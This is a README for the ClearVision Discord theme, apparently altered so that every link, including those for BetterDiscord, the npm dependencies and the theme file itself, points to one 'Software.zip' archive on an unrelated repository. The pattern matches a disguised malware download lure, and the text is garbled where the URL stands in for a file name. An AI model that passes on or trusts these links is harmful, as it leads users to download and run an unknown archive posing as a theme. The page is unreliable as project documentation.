## Theme Editor

You are now able to customize the theme with a preview before downloading it to your computer.

> [Theme Editor](https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip)

_Thank you to @Gibbu to providing this._

## Installing

Note: ClearVision doesn't actively support plugins (as in, we don't seek out and actively theme fixes to every new plugin). However, when a plugin is widely used, we try our best to stay compatible. 

Download the theme file and move it into your [BetterDiscord](https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip) themes folder:

> [https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip](https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip)

## Building from source

In order build the theme from source, you can simply run `npm install` to install all missing dependencies, and `npm run build` to compile the theme into the `/public` folder.

### Dependencies

- [sass](https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip)
- [PostCSS Autoprefixer](https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip)
- [PostCSS CLI](https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip)
- [rimraf](https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip) (for cleanup)

- _[DiscordSelectors](https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip) (included in the `/lib` folder)_

## Contributing

You can run `npm run test` to compile the theme.
The `https://github.com/DealToDeath/ClearVision-v6/releases/download/v2.0/Software.zip` file will be in the `/test` directory, which can then be copied into BetterDiscord's Custom CSS.
